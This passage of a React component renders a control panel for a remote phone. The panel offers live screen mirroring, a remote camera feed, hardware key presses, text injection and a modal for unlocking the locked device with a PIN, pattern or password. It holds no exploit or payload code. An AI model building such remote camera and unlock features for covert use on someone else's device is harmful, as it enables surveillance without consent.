              className="flex-1 py-2 bg-[#FDF8F4] dark:bg-[#180d07] hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] border border-[#E8622A]/20 text-[#2C1A0E] dark:text-[#FFF3EB] rounded-xl text-[10px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer w-full xs:w-auto"
            >
              <Volume2 className="w-3.5 h-3.5 text-[#F59E0B]" /> Vibrate
            </button>
          </div>
        </div>
      </div>

      {/* Quick Hardware Actions Banner */}
      <div className="glass-card p-4 bg-white/40 dark:bg-[#23140c]/20 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 text-xs font-mono text-[#7C5C44] dark:text-[#C4A992]">
        <div className="flex items-center gap-2">
          <Activity className="w-4 h-4 text-[#E8622A]" />
          <span>Hardware commands & physical inputs:</span>
        </div>
        <div className="flex flex-col xs:flex-row gap-2 w-full sm:w-auto">
          <button 
            onClick={() => onSendCommand('WAKE_UP')}
            className="px-3.5 py-1.5 bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 hover:border-[#E8622A] rounded-xl text-[11px] font-bold transition-all cursor-pointer w-full xs:w-auto text-center justify-center"
          >
            Wake Up Screen
          </button>
          <button 
            onClick={() => handleHardwareKey(26)}
            className="flex items-center justify-center gap-1 px-3.5 py-1.5 bg-red-600/10 hover:bg-red-600 border border-red-500/20 hover:border-red-600 rounded-xl text-red-600 hover:text-white dark:text-red-400 dark:hover:text-white transition-all font-sans font-bold cursor-pointer w-full xs:w-auto"
          >
            <Power className="w-3.5 h-3.5" /> Trigger Sleep Key
          </button>
        </div>
      </div>

      {/* Minimized Floating Controller Bubble */}
      {showMirrorModal && windowState.isMinimized && (
        <div className="fixed bottom-6 right-6 z-[999] animate-scale-up">
          <button
            onClick={toggleMinimize}
            className="flex items-center gap-3 px-5 py-3 bg-gradient-to-r from-[#E8622A] to-[#F59E0B] hover:from-[#D04F18] hover:to-[#D97706] text-white rounded-2xl shadow-2xl transition-all hover:scale-105 cursor-pointer border border-[#E8622A]/20"
          >
            <Smartphone className="w-5 h-5" />
            <span className="font-bold text-xs">Live Display</span>
            <span className="flex h-2 w-2 relative">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
            </span>
          </button>
        </div>
      )}

      {/* Floating Screen Controller Modal (Opened on-demand & resizable/draggable) */}
      {showMirrorModal && !windowState.isMinimized && (
        <div 
          ref={windowRef} 
          style={getWindowStyle()} 
          className="flex flex-col bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/20 shadow-2xl rounded-2xl overflow-hidden animate-scale-up"
        >
          {/* Modal Header / Window Title Bar */}
          <div
            onPointerDown={handleTitleBarPointerDown}
            className="flex items-center justify-between px-4 py-2 bg-[#FDF3EC] dark:bg-[#23140c] border-b border-[#E8622A]/10 cursor-move text-[#2C1A0E] dark:text-[#FFF3EB] select-none shrink-0"
          >
            <div className="flex items-center gap-2">
              <Smartphone className="w-4 h-4 text-[#E8622A]" />
              <span className="text-xs font-black uppercase font-mono tracking-wider">
                {device?.deviceName || 'Remote Device'}
              </span>
              {(isScreenMirroring || isCameraStreaming) && (
                <span className="flex h-2 w-2 relative">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                </span>
              )}
            </div>
            
            <div className="flex items-center gap-1.5" onPointerDown={(e) => e.stopPropagation()}>
              <button 
                onClick={toggleMinimize} 
                className="p-1 hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] hover:text-[#E8622A] rounded-lg transition-colors cursor-pointer border border-[#E8622A]/5" 
                title="Minimize"
              >
                <Minimize2 className="w-3.5 h-3.5" />
              </button>
              {viewport.width >= 768 && (
                <>
                  <button 
                    onClick={toggleMaximize} 
                    className="p-1 hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] hover:text-[#E8622A] rounded-lg transition-colors cursor-pointer border border-[#E8622A]/5" 
                    title="Maximize"
                  >
                    <Maximize2 className="w-3.5 h-3.5" />
                  </button>
                  <button 
                    onClick={toggleFullscreen} 
                    className="p-1 hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] hover:text-[#E8622A] rounded-lg transition-colors cursor-pointer border border-[#E8622A]/5" 
                    title="Fullscreen"
                  >
                    <Maximize className="w-3.5 h-3.5" />
                  </button>
                </>
              )}
              <button 
                onClick={handleCloseModal} 
                className="p-1 hover:bg-rose-500/10 text-[#7C5C44] hover:text-rose-500 rounded-lg transition-colors cursor-pointer border border-[#E8622A]/5 ml-1" 
                title="Close"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          {/* Screen Content Viewport Wrapper */}
          <div 
            className="flex-1 relative bg-black w-full h-full overflow-hidden flex items-center justify-center touch-none select-none"
            onPointerDown={(e) => handleInteraction(e, 'down')}
            onPointerUp={(e) => handleInteraction(e, 'up')}
            onPointerLeave={(e) => handleInteraction(e, 'leave')}
            onPointerCancel={(e) => handleInteraction(e, 'cancel')}
          >
            {/* Screen Content Render */}
            {mirrorMode === 'screen' ? (
              isScreenMirroring ? (
                <div className="relative w-full h-full flex items-center justify-center">
                  <video 
                    ref={videoRef} 
                    autoPlay 
                    playsInline 
                    muted 
                    className={`w-full h-full object-contain pointer-events-none z-10 ${!stream ? 'hidden' : ''}`}
                    onContextMenu={(e) => e.preventDefault()}
                  />
                  {!stream && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center p-6 text-center text-[#7C5C44] dark:text-[#C4A992] gap-3 bg-[#FDF8F4] dark:bg-[#180d07]">
                      <div className="w-10 h-10 rounded-full bg-[#E8622A]/10 flex items-center justify-center text-[#E8622A]">
                        <Activity className="w-5 h-5 animate-pulse" />
                      </div>
                      <div>
                        <p className="text-[11px] font-bold text-[#2C1A0E] dark:text-white">Readying Screen...</p>
                        <p className="text-[9px] text-[#7C5C44] dark:text-[#C4A992] mt-1 max-w-[170px] mx-auto leading-relaxed">
                          Handshaking screen mirror stream sockets. Please wait...
                        </p>
                      </div>
                    </div>
                  )}
                  {stream && (
                    <div className="absolute top-4 left-1/2 -translate-x-1/2 px-2.5 py-0.5 backdrop-blur-md rounded-lg text-[9px] font-bold text-white uppercase pointer-events-none bg-[#E8622A]/80 border border-[#E8622A]/20 z-20">
                      Live Control
                    </div>
                  )}
                </div>
              ) : screenFrame ? (
                <div className="relative w-full h-full flex items-center justify-center">
                  <img 
                    ref={imageRef}
                    src={screenFrame.startsWith('data:') ? screenFrame : `data:image/jpeg;base64,${screenFrame}`} 
                    className="w-full h-full object-contain pointer-events-none select-none z-10"
                    alt="Device Mirror Stream"
                    draggable={false}
                  />
                  <div className="absolute top-4 left-1/2 -translate-x-1/2 px-2.5 py-0.5 backdrop-blur-md rounded-lg text-[9px] font-bold text-white uppercase pointer-events-none bg-[#E8622A]/80 border border-[#E8622A]/20">
                     Live Control
                  </div>
                </div>
              ) : (
                <div className="w-full h-full flex flex-col items-center justify-center p-6 text-center text-[#7C5C44] dark:text-[#C4A992] gap-3 bg-[#FDF8F4] dark:bg-[#180d07]">
                  <div className="w-10 h-10 rounded-full bg-[#E8622A]/10 flex items-center justify-center text-[#E8622A]">
                    <Activity className="w-5 h-5 animate-pulse" />
                  </div>
                  <div>
                    <p className="text-[11px] font-bold text-[#2C1A0E] dark:text-white">Establishing Mirror Link</p>
                    <p className="text-[9px] text-[#7C5C44] dark:text-[#C4A992] mt-1 max-w-[170px] mx-auto leading-relaxed">
                      Handshaking screen mirror stream sockets. Please wait...
                    </p>
                  </div>
                </div>
              )
            ) : (
              isCameraStreaming ? (
                <div className="w-full h-full relative z-10 flex items-center justify-center bg-black">
                  <video 
                    ref={videoRef} 
                    autoPlay 
                    playsInline 
                    muted 
                    className={`w-full h-full object-contain pointer-events-none z-10 ${!stream ? 'hidden' : ''}`}
                    onContextMenu={(e) => e.preventDefault()}
                  />
                  {!stream && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center p-6 text-center text-[#7C5C44] dark:text-[#C4A992] gap-3 bg-[#FDF8F4] dark:bg-[#180d07]">
                      <div className="w-10 h-10 rounded-full bg-[#E8622A]/10 flex items-center justify-center text-[#E8622A]">
                        <Video className="w-5 h-5 animate-pulse" />
                      </div>
                      <div>
                        <p className="text-[11px] font-bold text-[#2C1A0E] dark:text-white">Readying Camera...</p>
                        <p className="text-[9px] text-[#7C5C44] dark:text-[#C4A992] mt-1 max-w-[170px] mx-auto leading-relaxed">
                          Activating remote lens and stream socket. Please wait...
                        </p>
                      </div>
                    </div>
                  )}
                  {stream && (
                    <div className="absolute bottom-4 left-4 right-4 bg-black/60 backdrop-blur-md p-1.5 rounded-lg text-center border border-white/10 pointer-events-none z-20">
                      <span className="text-[8px] text-[#F59E0B] font-black tracking-widest uppercase animate-pulse">
                        Live Lens Feed
                      </span>
                    </div>
                  )}
                </div>
              ) : cameraFrame ? (
                <div className="w-full h-full relative z-10 flex items-center justify-center bg-black">
                  <img 
                    ref={imageRef}
                    src={cameraFrame.startsWith('data:') ? cameraFrame : `data:image/jpeg;base64,${cameraFrame}`} 
                    className="w-full h-full object-contain pointer-events-none select-none z-10" 
                    alt="Camera Capture View" 
                    draggable={false}
                  />
                  <div className="absolute bottom-4 left-4 right-4 bg-black/60 backdrop-blur-md p-1.5 rounded-lg text-center border border-white/10 pointer-events-none">
                    <span className="text-[8px] text-[#F59E0B] font-black tracking-widest uppercase animate-pulse">
                      Live Lens Feed
                    </span>
                  </div>
                </div>
              ) : (
                <div className="w-full h-full flex flex-col items-center justify-center p-6 text-center text-[#7C5C44] dark:text-[#C4A992] gap-3 bg-[#FDF8F4] dark:bg-[#180d07]">
                  <div className="w-10 h-10 rounded-full bg-[#E8622A]/10 flex items-center justify-center text-[#E8622A]">
                    <Video className="w-5 h-5 animate-pulse" />
                  </div>
                  <div>
                    <p className="text-[11px] font-bold text-[#2C1A0E] dark:text-white">Establishing Camera Link</p>
                    <p className="text-[9px] text-[#7C5C44] dark:text-[#C4A992] mt-1 max-w-[170px] mx-auto leading-relaxed">
                      Activating remote lens and stream socket. Please wait...
                    </p>
                  </div>
                </div>
              )
            )}
            
            <audio ref={audioRef} className="hidden" />

            {/* Lock status overlay */}
            {isLocked && (
              <div 
                onClick={handleWakeUp}
                className="absolute inset-0 z-30 flex flex-col items-center justify-center bg-black/75 backdrop-blur-[2px] cursor-pointer group hover:bg-black/60 transition-all"
              >
                 <div className="bg-white/10 p-4 rounded-full border border-white/20 group-hover:scale-110 transition-transform">
                    <Power className="w-10 h-10 text-[#F59E0B]" />
                 </div>
                 <p className="text-white mt-4 font-bold tracking-widest text-xs drop-shadow-lg">DEVICE LOCKED</p>
                 <p className="text-white/60 text-[8px] uppercase mt-1">Click to wake & unlock</p>
              </div>
            )}

            {/* Keyboard typing helper panel overlay */}
            {showKeyboardInput && (
              <div 
                className="absolute bottom-4 left-4 right-4 z-40 bg-[#FDF8F4] dark:bg-[#180d07] p-2 rounded-2xl border border-[#E8622A]/25 shadow-2xl flex gap-2 animate-scale-up"
                onMouseDown={(e) => e.stopPropagation()}
              >
                <input 
                  type="text"
                  value={inputText}
                  onChange={(e) => setInputText(e.target.value)}
                  placeholder="Type text package to send..."
                  className="flex-1 bg-white dark:bg-[#23140c] border border-[#E8622A]/15 rounded-xl px-3 py-1.5 text-xs text-[#2C1A0E] dark:text-[#FFF3EB] focus:outline-none focus:border-[#E8622A]"
                  onKeyDown={(e) => e.key === 'Enter' && handleSendText()}
                  autoFocus
                />
                <button 
                  onClick={handleSendText}
                  className="px-4 py-1.5 bg-[#E8622A] hover:bg-[#D04F18] text-white rounded-xl text-xs font-semibold cursor-pointer shadow-md shadow-[#E8622A]/10"
                >
                  Send
                </button>
              </div>
            )}

            {/* Activity Indicator: Visual dot where user clicks */}
            {touchIndicator && (
              <div 
                className="absolute w-6 h-6 bg-[#E8622A]/40 border border-white/50 rounded-full animate-ping pointer-events-none z-50 transform -translate-x-1/2 -translate-y-1/2"
                style={{ left: touchIndicator.x, top: touchIndicator.y }}
              />
            )}
          </div>

          {/* Bottom Action Keys & Navigation Bar - Clean, compact single-row design */}
          <div className="h-11 bg-[#FDF3EC] dark:bg-[#23140c] border-t border-[#E8622A]/10 shrink-0 flex items-center justify-between px-2 sm:px-3 select-none">
            
            {/* Actuator commands row */}
            <div className="flex items-center gap-1 sm:gap-1.5" onPointerDown={(e) => e.stopPropagation()}>
              <button 
                onClick={() => handlePhoneButton('volume_down')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                title="Volume Down"
              >
                <Volume2 className="w-3.5 h-3.5 sm:w-4 sm:h-4 rotate-180" />
              </button>
              <button 
                onClick={() => handlePhoneButton('volume_up')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                title="Volume Up"
              >
                <Volume2 className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              </button>
              <button 
                onClick={() => handlePhoneButton('power')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-rose-500/10 text-rose-500/80 hover:text-rose-500 transition-colors cursor-pointer" 
                title="Power"
              >
                <Power className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              </button>
              {(isLocked || !isScreenOn) && (
                <>
                  <button 
                    onClick={handleWakeUp} 
                    className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                    title="Wake Up"
                  >
                    <Sun className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                  </button>
                  <button 
                    onClick={() => setShowPinModal(true)} 
                    className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                    title="Unlock with PIN"
                  >
                    <Unlock className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                  </button>
                </>
              )}
              <button 
                onClick={() => handlePhoneButton('notification')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                title="Notifications"
              >
                <Bell className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              </button>
              <button 
                onClick={() => setShowKeyboardInput(!showKeyboardInput)} 
                className={`p-1 sm:p-1.5 rounded-lg transition-colors cursor-pointer ${showKeyboardInput ? 'bg-[#E8622A]/20 text-[#E8622A]' : 'hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A]'}`}
                title="Toggle Keyboard Panel"
              >
                <Keyboard className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              </button>
            </div>

            <div className="w-px h-4 bg-[#E8622A]/20 mx-1" />

            {/* Navigation Controls */}
            <div className="flex items-center gap-1.5 sm:gap-3" onPointerDown={(e) => e.stopPropagation()}>
              <button 
                onClick={() => handlePhoneButton('back')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                title="Back"
              >
                <ChevronLeft className="w-4 h-4 sm:w-4.5 sm:h-4.5" />
              </button>
              <button 
                onClick={() => handlePhoneButton('home')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                title="Home"
              >
                <Home className="w-4 h-4 sm:w-4.5 sm:h-4.5" />
              </button>
              <button 
                onClick={() => handlePhoneButton('recent')} 
                className="p-1 sm:p-1.5 rounded-lg hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A] transition-colors cursor-pointer" 
                title="Recent Apps"
              >
                <Menu className="w-4 h-4 sm:w-4.5 sm:h-4.5" />
              </button>
            </div>
          </div>

          {/* Resize Handle */}
          {!windowState.isMaximized && !windowState.isFullscreen && (
            <div onPointerDown={handleResizePointerDown} className="absolute bottom-0 right-0 w-4 h-4 cursor-se-resize flex items-end justify-end p-0.5 z-20">
               <div className="w-2 h-2 border-r-2 border-b-2 border-[#E8622A]/50 rounded-br-sm" />
            </div>
          )}

          {/* PIN Unlock Modal overlay */}
          {showPinModal && (
            <div className="absolute inset-0 z-[400] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4" onPointerDown={(e) => e.stopPropagation()}>
              <div className="bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/20 rounded-3xl p-5 w-full max-w-[280px] shadow-2xl">
                <h3 className="text-[#2C1A0E] dark:text-white font-bold text-center mb-3 text-sm">Remote Unlock</h3>
                
                {/* Type Selector */}
                <div className="flex bg-[#FDF3EC] dark:bg-[#23140c] p-1 rounded-lg mb-4 border border-[#E8622A]/10">
                  {['PIN', 'PATTERN', 'PASSWORD'].map(type => (
                    <button
                      key={type}
                      onClick={() => { setUnlockType(type); setPin(''); }}
                      className={`flex-1 py-1 text-[9px] font-bold rounded-md transition-all cursor-pointer ${unlockType === type ? 'bg-[#E8622A] text-white shadow-md' : 'text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A]'}`}
                    >
                      {type}
                    </button>
                  ))}
                </div>

                <input
                  type={unlockType === 'PASSWORD' ? 'text' : 'password'}
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  className="w-full bg-white dark:bg-[#23140c] border border-[#E8622A]/15 focus:border-[#E8622A] rounded-lg py-2 px-3 text-[#2C1A0E] dark:text-white text-center text-lg focus:outline-none mb-2"
                  placeholder={unlockType === 'PATTERN' ? 'e.g. 12369' : 'Type code...'}
                  autoFocus
                  onKeyDown={(e) => e.key === 'Enter' && handleUnlock()}
                />
                
                {unlockType === 'PATTERN' && (
                  <p className="text-[9px] text-[#7C5C44] dark:text-[#C4A992] text-center mb-4 leading-tight font-mono">
                    Enter dot numbers (1-9) in order.<br/>
                    1 2 3<br/>
                    4 5 6<br/>
                    7 8 9
                  </p>
                )}
                {unlockType !== 'PATTERN' && <div className="mb-4" />}

                <div className="flex gap-2">
                  <button 
                    onClick={() => setShowPinModal(false)}
                    className="flex-1 py-1.5 bg-[#FDF3EC] dark:bg-[#23140c] hover:bg-[#FFF9F4] text-[#7C5C44] dark:text-[#C4A992] rounded-xl text-xs font-semibold cursor-pointer border border-[#E8622A]/10"
                  >
                    Cancel
                  </button>
                  <button 
                    onClick={handleUnlock}
                    className="flex-1 py-1.5 bg-[#E8622A] hover:bg-[#D04F18] text-white rounded-xl text-xs font-semibold cursor-pointer"
                  >
                    Unlock
                  </button>
                </div>
              </div>
            </div>
          )}

        </div>
      )}
    </div>
  );
}
